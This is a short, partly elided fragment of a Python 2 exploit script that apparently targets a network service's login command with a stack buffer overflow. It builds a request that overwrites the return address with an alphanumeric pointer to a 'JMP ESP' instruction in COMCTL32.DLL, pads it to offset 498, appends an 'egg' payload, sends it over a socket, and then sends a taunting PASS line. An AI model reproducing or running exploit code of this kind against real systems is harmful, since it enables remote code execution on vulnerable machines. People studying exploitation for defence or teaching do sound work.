...
if __name__ == '__main__':
    ...
    login_req += 'llGw' # offset = 490: alphanum address of 'JMP ESP' in COMCTL32.DLL
    login_req += 'A'*(498 - len(login_req)) # alphanum padding
    login_req += egg # offset = 498: ESP points here
    login_req += '\r\n'
    ...
    print 
    print soc.recv(1024)
    soc.send('PASS yourscrewedanyway!\r\n')
